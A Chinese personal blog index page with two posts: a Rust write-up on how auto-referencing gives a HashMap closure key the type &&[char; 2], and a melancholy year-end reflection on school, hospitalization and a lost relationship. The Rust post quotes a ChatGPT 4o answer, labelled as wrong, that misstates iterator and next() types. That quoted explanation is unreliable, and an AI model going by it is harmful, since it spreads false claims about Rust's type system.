<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"amiriox.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="Hey.">
<meta property="og:type" content="website">
<meta property="og:title" content="Amiriox&#39;s Storage">
<meta property="og:url" content="https://amiriox.github.io/index.html">
<meta property="og:site_name" content="Amiriox&#39;s Storage">
<meta property="og:description" content="Hey.">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="amiriox">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://amiriox.github.io/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Amiriox's Storage</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --></head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Amiriox's Storage</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">To guard this love to the death.</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">amiriox</p>
  <div class="site-description" itemprop="description">Hey.</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">23</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://amiriox.github.io/2025/01/31/problem-rust-ref/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="amiriox">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Amiriox's Storage">
      <meta itemprop="description" content="Hey.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Amiriox's Storage">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/01/31/problem-rust-ref/" class="post-title-link" itemprop="url">记一次 Rust 类型系统的问题解决</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-01-31 17:26:06" itemprop="dateCreated datePublished" datetime="2025-01-31T17:26:06+08:00">2025-01-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-10 14:23:20" itemprop="dateModified" datetime="2025-02-10T14:23:20+08:00">2025-02-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/" itemprop="url" rel="index"><span itemprop="name">问题解决</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>在做 Codeforces Educational Round 169 D Colored Portals 时，需要找到
i 前面距离 i 最近的颜色不完全相同但也不完全不同的 j，我随手写了个</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> vector&lt;string&gt; type = &#123;<span class="string">&quot;BG&quot;</span>, <span class="string">&quot;BR&quot;</span>, <span class="string">&quot;BY&quot;</span>, <span class="string">&quot;GR&quot;</span>, <span class="string">&quot;GY&quot;</span>, <span class="string">&quot;RY&quot;</span>&#125;;</span><br><span class="line">map&lt;string, <span class="type">int</span>&gt; m;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">lc</span><span class="params">(n, <span class="number">-1</span>)</span>, <span class="title">rc</span><span class="params">(n, <span class="number">-1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">auto</span> condi = m | <span class="built_in">filter</span>([&amp;](<span class="type">const</span> <span class="keyword">auto</span> &amp;p) &#123; <span class="keyword">return</span> p.first != in[i] &amp;&amp; <span class="built_in">has_same</span>(p.first, in[i]); &#125;);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> lci = ranges::<span class="built_in">max_element</span>(</span><br><span class="line">                condi, [](<span class="type">const</span> <span class="keyword">auto</span> &amp;a, <span class="type">const</span> <span class="keyword">auto</span> &amp;b) &#123; <span class="keyword">return</span> a.second &lt; b.second; &#125;);</span><br><span class="line">            lci != ranges::<span class="built_in">end</span>(condi)) &#123;</span><br><span class="line">            lc[i] = lci-&gt;second;</span><br><span class="line">    &#125;</span><br><span class="line">    m[in[i]] = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后吐槽了下 C++ 没有 <code>.iter().filter()</code> 或者
<code>.iter().map()</code> 这种写法</p>
<p>于是我就建了个 D.rs 写了个 Rust 版本的:</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">has_same</span>(a: &amp;[<span class="type">char</span>; <span class="number">2</span>], b: &amp;[<span class="type">char</span>; <span class="number">2</span>]) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">    (a[<span class="number">0</span>] == b[<span class="number">0</span>] || a[<span class="number">0</span>] == b[<span class="number">1</span>]) || (a[<span class="number">1</span>] == b[<span class="number">0</span>] || a[<span class="number">1</span>] == b[<span class="number">1</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">n</span> : <span class="type">usize</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">inv</span> : <span class="type">Vec</span>&lt;[<span class="type">char</span>; <span class="number">2</span>]&gt; = <span class="built_in">vec!</span>[[<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;R&#x27;</span>], [<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;R&#x27;</span>], [<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>], [<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;R&#x27;</span>]]; <span class="comment">// simple</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">map</span> : HashMap&lt;[<span class="type">char</span>; <span class="number">2</span>], <span class="type">i32</span>&gt; = HashMap::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">lc</span> = <span class="built_in">vec!</span>[-<span class="number">1</span>; n];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0usize</span>..n &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(lci) = map.<span class="title function_ invoke__">iter</span>()</span><br><span class="line">            .<span class="title function_ invoke__">filter</span>(|(key, _)| *key != &amp;inv[i] &amp;&amp; <span class="title function_ invoke__">has_same</span>(key, &amp;inv[i]))</span><br><span class="line">            .<span class="title function_ invoke__">max_by</span>(|a, b| a.<span class="number">1</span>.<span class="title function_ invoke__">cmp</span>(&amp;b.<span class="number">1</span>)) &#123;</span><br><span class="line">            lc[i] = *lci.<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        map.<span class="title function_ invoke__">insert</span>(inv[i].<span class="title function_ invoke__">clone</span>(), i <span class="keyword">as</span> <span class="type">i32</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, lc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我不是什么 Rust 高手但至少 rustlings 是写完了，然而上次写 rs
还是三四个月之前了，所以这里的 <code>*key != &amp;inv[i]</code>
一开始写成 <code>*key = inv[i]</code>
了，然后发现了一个有意思的现象：</p>
<ul>
<li><p>当我写 <code>key != &amp;inv[i]</code> 时报错
<code>no implement for &amp;[char; 2] ==[char;2]</code></p></li>
<li><p>当我写 <code>key != inv[i]</code> 时报错
<code>no implement for &amp;&amp;[char;2] == [char;2]</code></p></li>
</ul>
<p>这我就有两点疑问：</p>
<ol type="1">
<li><code>&amp;inv[i]</code> 不应该是 <code>&amp;[char;2]</code>
吗？为什么这里说他是 <code>[char;2]</code> ?</li>
<li><code>key</code> 的类型为什么变化了？</li>
</ol>
<p>有意思的是这个问题能把 4o 或者 r1
全爆了，前者胡言乱语后者卡在深度思考的逻辑链里出不来，当然这里 4o 应该是
OpenAI 为了卖 o1 强行降智了</p>
<p>我回想了一下引用那一节(<del>其实是根本没想起来什么直接翻书去了</del>)发现有个自动解引用和自动借用机制存在，简单说就是引用比较引用自动解引用，需要引用的地方可以自动引用</p>
<p>于是就有了以下可以解释通的说法：</p>
<ul>
<li>对于<code>key != &amp;inv[i]</code> 时两边分别为
<code>&amp;&amp;[char; 2] != &amp;[char; 2]</code>， 同时自动解引用就是
<code>&amp;[char; 2] != [char; 2]</code>，根据报错误以为
<code>key</code> 是 <code>&amp;[char; 2]</code> 而
<code>&amp;inv[i]</code> 是 <code>[char; 2]</code> 了</li>
<li>对于<code>key != inv[i]</code> 时两边分别为
<code>&amp;&amp;[char; 2]</code> 和 <code>[char; 2]</code></li>
</ul>
<p>这就很 make sense 了，但还有一个问题可以思考，key 的
<code>&amp;&amp;[char; 2]</code> 类型是怎么来的？</p>
<p><code>ChatGPT 4o</code> 做出了<strong>错误</strong>的回答:</p>
<blockquote>
<p><strong>如下解释是错误的！！！</strong></p>
<p>好的，我明白了你在问什么。</p>
<p>当你执行 <code>map.iter().next()</code> 时，返回的类型是
<code>Option&lt;(&amp;K, &amp;V)&gt;</code>，而不是
<code>Option&lt;&amp;(&amp;K, &amp;V)&gt;</code>。这看起来有些反直觉，但实际上是因为
<code>map.iter()</code> 本身已经返回了每个元素的引用，而 .next()
返回的是引用的元素本身，而不是引用的引用。 解释：</p>
<ol type="1">
<li><p><code>map.iter()</code> 返回 <code>&amp;(&amp;K, &amp;V)</code>：
<code>map.iter()</code> 返回的是 HashMap 中元素的 引用，也就是
<code>&amp;(&amp;K, &amp;V)</code>，这意味着你得到了对 HashMap
中每个二元组 (K, V) 的引用。</p>
<p>其中 <code>&amp;K</code> 是对键 K 的引用。 <code>&amp;V</code> 是对值
V 的引用。</p>
<p>所以 <code>map.iter()</code> 迭代的每一项类型是
<code>(&amp;K, &amp;V)</code>，但是由于这些是对元素的引用，所以整个类型是
<code>&amp;(&amp;K, &amp;V)</code>，即 HashMap 中元素的 引用。</p></li>
<li><p><code>.next()</code> 返回的是
<code>Option&lt;(&amp;K, &amp;V)&gt;</code>： <code>.next()</code> 是对
<code>map.iter()</code>
返回的迭代器的调用，它会返回迭代器中的下一个元素。</p>
<p>在这种情况下，<code>map.iter()</code> 本身返回的是每个元素的引用，而
<code>next()</code> 直接返回这些元素的引用，因此返回类型是
<code>Option&lt;(&amp;K, &amp;V)&gt;</code>，这就是迭代器的下一项是对元素的引用。</p>
<p>可以理解为 <code>next()</code> 相当于解了一层引用。</p></li>
</ol>
<p>当你调用 <code>map.iter()</code> 时，它返回的是
<code>&amp;(&amp;K, &amp;V)</code>，也就是对二元组的引用，且这个二元组本身已经包含了对键和值的引用。所以，<code>next()</code>
方法直接返回这个引用，并解开了一个层级，即返回了
<code>Option&lt;(&amp;K, &amp;V)&gt;</code>，而不是
<code>Option&lt;&amp;(&amp;K, &amp;V)&gt;</code>。</p>
<p>总结起来：</p>
<ul>
<li><p><code>map.iter()</code> 返回的是对 <code>(K, V)</code>
元素的引用，即 <code>&amp;(&amp;K, &amp;V)</code>。</p></li>
<li><p><code>.next()</code> 解开了这层引用，直接返回了
<code>Option&lt;(&amp;K, &amp;V)&gt;</code>。</p></li>
</ul>
<p>这样就可以避免不必要的引用，简化了类型。</p>
</blockquote>
<p>如果我到这就信了就完了，事实上对于你无法验证答案真伪的问题不要问大模型，这里只是希望它提供一点灵感思路。</p>
<p>我查看 Rust 文档发现 <code>.iter()</code> 的例子中，普通数组的
<code>.iter().next()</code> 实际上是 <code>Option&lt;&amp;T&gt;</code>
即 <code>Some(&amp;T)</code> 或 <code>None</code>，也就是说并不存在
“next 解了一层引用” 之类的说法（但它其实有一部分说的是对的，AI
就是这样半真半假不能全信），此时它还在狡辩说只有 HashMap 的 next
会解引用。</p>
<p>估计出幻觉了，于是在编辑器中写以下代码：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">map</span> = HashMap::&lt;<span class="type">i32</span>, <span class="type">i32</span>&gt;::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">vecs</span> = <span class="type">Vec</span>::&lt;(<span class="type">i32</span>, <span class="type">i32</span>)&gt;::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">arr</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">_map_iter</span> = map.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">next</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">_vecs_iter</span> = vecs.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">next</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">_arr_iter</span> = arr.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">next</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>按 <code>Shift + K</code> (即 neovim 的 <code>K</code> ) 借用
rust-analyzer LSP 查看类型，分别是：</p>
<ol type="1">
<li><p><code>Option&lt;(&amp;i32, &amp;i32)&gt;</code></p></li>
<li><p><code>Option&lt;&amp;(i32, i32)&gt;</code></p></li>
<li><p><code>Option&lt;&amp;i32&gt;</code></p></li>
</ol>
<p>这里我们知道：</p>
<ul>
<li><p>Rust
的迭代器实际上是容器元素的引用而不是值，出于效率等目的。</p></li>
<li><p>Vec
的情况符合我们的预期，即迭代器是对容器里某个元素整体的引用</p></li>
</ul>
<p>再次翻阅 HashMap 的文档，发现 <code>.iter()</code> 的返回值类型是
<code>Iter&lt;K, V&gt;</code> 而 <code>Iter</code> 中有一个
<code>Item</code> 是 <code>(&amp;K, &amp;V)</code> ， 那么也就破案了
HashMap 迭代器的类型</p>
<p>但回到最初的问题发现还是对不上，为什么 key 是对引用的引用？</p>
<p>仔细思考发现这里我忽略了闭包里的值本身就是对迭代器的引用。所以最前面那个对二元组的引用其实是闭包里出现的对迭代器的引用，但是迭代器本身又是对元素（包含两个引用的二元组）的引用，所以这里是对引用的引用。模式匹配后
key 继承了这两层引用：一层是对迭代器的，一层是迭代器对元素的。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://amiriox.github.io/2025/01/26/2022-2023-2024/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="amiriox">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Amiriox's Storage">
      <meta itemprop="description" content="Hey.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Amiriox's Storage">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/01/26/2022-2023-2024/" class="post-title-link" itemprop="url">墓碑与太阳 -- 三年年终总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-01-26 22:24:33" itemprop="dateCreated datePublished" datetime="2025-01-26T22:24:33+08:00">2025-01-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-10 14:23:20" itemprop="dateModified" datetime="2025-02-10T14:23:20+08:00">2025-02-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>生命不是惋惜或哀悼，也不是仰慕和歌颂。</p>
<p>生命是一种力，无所不用其极地把活着与死亡区分开来的力，就像人们竭力把节日和平常区分开来一样——尽管其中并无区别。</p>
<p>从这个角度来看，求生欲就是生命本身，生命就是一座墓碑。</p>
<p>墓碑见过吗？在人的坟墓前立一块石头，镌刻上逝者生前的功绩，或者琐事。</p>
<p>其实我们完全没必要这样做的，但是我们还是做了，这就是人类文明。</p>
<hr />
<h1 id="我打算重写这个了">我打算重写这个了</h1>
<h2 id="新生">新生 ?</h2>
<p>继上一篇年终总结以来已经整三年了，包括两年半的高中和半年的大学生活。我还是难以置信自己从高中的生活力走出来了：如果我能回头，我一定能能看到当年数着倒计时的自己向我投来难以置信的目光。倘若我们之间还有张若隐若现的幕布，并且只有隐约的声音能传达给对方，想必会更有意思的。请原谅我，我并非有意折磨过去的自己，毕竟那个时候的我对大学一定是充满希望的，未知阻挡不了他的脚步。</p>
<p>我们说到哪来着？精神状态异常的高一新生？如果我足够懒惰，这篇文章只要把高一改成大一就可以结束了。遗憾的是，我并不懒惰，现在的生活也并非新生。</p>
<h2 id="高一">高一</h2>
<p>我实在不记得什么了。</p>
<h2 id="高二">高二</h2>
<p>绝境中的我还是爆发出了求生的勇气，尽管我现在也分不清这是勇敢还是鲁莽，还是某种恶俗的隐喻或者自欺欺人的
cosplay
——这评价可太对了。总之，我请了一个晚自习的长假，然后跑去自习室学算竞之类的，当然后期不搞
OI 了也是在自习室学文化课。在一个没有校队的县城自学往往没什么学 OI
的氛围感也很难有 OIer
的身份认同和社会关系——即便是现在也不知道取得这样平淡成绩的自己能否算
OIer, 况且还是在那时认识的朋友现在基本都不联系了的情况下。我的 OI
生涯就像某种 cosplay,
似乎就是在追寻一种离奇的代入感。现在的我时常感叹于初中的自己在 OIer
里扎了跟、找到了家，到了高中就有些自以为坚定地迷茫了。</p>
<p>我实在不记得什么了。</p>
<h2 id="高三">高三</h2>
<p>这倒是丰富多彩，只是我自己也区分不出褒义或贬义。</p>
<p>在班上的人际关系矛盾日益明显，内心的慌乱日益增长。</p>
<p>我和我当时最好的朋友表白了，
我们在一起了，然后分手了。时至今日依旧觉得像一场梦，我逃避般地前往另一座城市，又跌跌撞撞地回来。现在想起来，我们很难被称作是相似的人。天台、远方、双盲诗，一定是两位的高三都过得不太好，对吧？</p>
<p>当时的我倒展现了难以置信的所谓抗逆性，回家的几天后就回了学校，然后机械地做题。当然，后面一段时间反而是没了什么血性，晚上翘掉晚自习去唱歌，有些浑浑噩噩了。</p>
<p>在学校的生活日益紧张，现实里唯一的朋友转了班，这教室真是越来越令人窒息了。我不想多谈，实际上也不记得什么了，只记得觉得自己不能这样下去了，就去住院了。我实际上是抱着在里面冷静下来——逃离了班级——然后好好自学，等缓得还不错了再出来，然而后面的事情却完全出乎了我的意料，我更倾向于说这是褒义。</p>
<p>第一次见到她时我的行为令我自己都感到惊讶，但我不想谈也不记得什么了（这是可悲的），总之在学校已经忘了人话是怎么说的我居然和她交谈上了。我在当时的日记里写满了不要追她，但我也只有那时候写了日记。</p>
<p>我记得我们一起哭、一起笑，还记得她的生日，我的礼物，照片与相册、海藻球和手作。我记得我们谈理想，你说你选择教育的出发点是为了弥补家长对孩子带来的伤害。</p>
<p>我记得我的耳机连到了她的蓝牙，我记得她难受的时候我的心也跟着阵痛。</p>
<p>好想和你在一起啊，如果我真的能给你带来些什么的话。</p>
<blockquote>
<p>🎵 春天是她最爱的季节 🎵</p>
<p>我对她唱着，一边问她：是吗？</p>
<p>她说，可以是。</p>
</blockquote>
<p>我们戴着一双耳机，听 Taylor Swift 的 You Belong With Me.</p>
<p>我记得那天昏暗的走廊上，她对我“为什么不可以呢？你不也会长大吗？”。恰如其分关闭的灯光掩盖了我的脸红，爱意淹没在人们的安眠中。两只手就那样牵到了一起，我感受着她的疲倦、她的勇气，她压低的声音和她握着我的手的触感，单调青涩地表达着我的心意——如果我真的有表达到了的话。</p>
<p>我们戴着一双耳机，听陶喆的蝴蝶。</p>
<p>她为我做了一只点翠工艺的戒指。其实那天她没能做成功，但是后来又努力做了出来给我。我给她缝了一只手包，其实那天是我第一次拿起一根针。</p>
<p>后面还有很多事，这里就不一一展开了。我并不会像枯野瑛那样，残忍地在一个悲剧结局前作过多的美好铺垫，但是命运会。</p>
<p>那天你睡着了我看了你好久，想着我们永远不要分开。</p>
<p>那天你睡着了我看了你好久，我知道我们早晚要分开的。</p>
<p>可你还是“把该说的都说完了”，可你还是说“未来的路还有很长，希望你可以越来越好吧“。我不愿再回忆那个难眠的夜晚，<em>幸运</em>的是也没什么溶质需要溶于人们的安眠中了。</p>
<p><a
target="_blank" rel="noopener" href="https://www.luogu.com/article/618z01yx">「僕らは約束した」《我心中危险的东西》带给我的</a></p>
<p>这一段的文字比文章开头的概述尔尔加起来还多，但我并不后悔在这件事上花费更多的篇幅，多少也不后悔。</p>
<p>只是前些日子又想起来你。你的离开是明智的，比翼鸟只是不可及的传说，我们治愈对方的同时也在伤害对方。是我一开始就不应该上前去，我玷污了你的人生。</p>
<p>可是我还是很想你啊。</p>
<p>我实在不记得什么了。我没能展现出多少抗逆性，我回家，狠狠地放了市二模
省三模的鸽子，不分昼夜，庸庸碌碌地混日子。我也不是没有反抗过，我试图写
Minecraft 的 Mod, 我买来数位板试图画画,
统统被笼罩在我房间里的忧伤以及对高考的恐惧扼杀。</p>
<p>考前一周多的时候，母亲说我这辈子也就这样了。</p>
<p>我想要是你还在该多好啊。</p>
<p>我实在不记得什么了。我实在不记得什么了。我不想忘记。</p>
<h2 id="新生-1">新生 ?</h2>
<p>前往大学的途中父亲失误把行李箱砸在别人身上了。下榻在一间简陋的旅馆，我的大学生活就这样开始了。我多少年来梦想着我会用多么精彩的文笔和宏大的篇幅描述我的高考假期。刚认识她天，她说高考假期真的可以好好利用。后来，她也陪伴着准备高考的我，是我那个挣扎的困境中强有力的支柱。</p>
<blockquote>
<p>所以要开开心心地结束高考哦</p>
<p>到时候找个小城租个民宿</p>
<p>我们可以一起呆很久</p>
</blockquote>
<p>只可惜天生傲骨的我没能玩过那两张卷子，也再也看不清艳阳天；不出意外的话，也再看不到她对我笑了。(这几段其实取自谁的一篇作文，我记不清了。)</p>
<p>这半年的生活，没有什么好写的。相反地，我想和你讨论阳光的神性，讨论我现在的生活。</p>
<p>太阳提供光和热，是农业生产的基础。太阳的周期性变化与时间和季节密切相关。埃及人的
Ra、苏美尔人的 Utu、印度人的 Surya、希腊神话的 Helios、罗马帝国的 Sol
Invictus、阿兹特克文明的 Tonatiuh…
一颗可控核聚变的恒星抚养着地球，挑战着人类对核的想象力，引领着人类的探索、温润着人类的生活。</p>
<p>我不记得那些流泪的夜晚，阳光帮我模糊了它们。我的心其实有一种不切实际也无疾而终的幻想，追求着的梦境里：血肉安然封闭在皮肤下，阳光中的红外线温暖着皮肤上的感受器，被拥抱着的自由神经末梢取悦伏隔核与前额叶，身体像一整章和谐的诗篇。</p>
<p>但是现在只有冬天。脚下踩的是冬天，敲击脸颊的是冬天，激烈的言语和无谓的挣扎也一样是冬天。我“努力把生活过好”的激情和热量一起被带走了。我不死心：</p>
<blockquote>
<p>只要我的生命一息尚余，夏天就会永远延续。</p>
</blockquote>
<p>为此，我把曾经视为生命的算法竞赛强行降权，可又不知道又有什么是值得热爱的。我思来想去，终于看见了自己的孤独。我喜欢的只有算法，没有竞赛。</p>
<p><em>其实这段可能还是需要酝酿一会吧。</em></p>
<p>雾来了，一切都白搭。</p>
<p>没什么好说的了，我其实很想把这篇写成一篇比较积极的文章，但是我坚持不下去了，这里没有转折。</p>
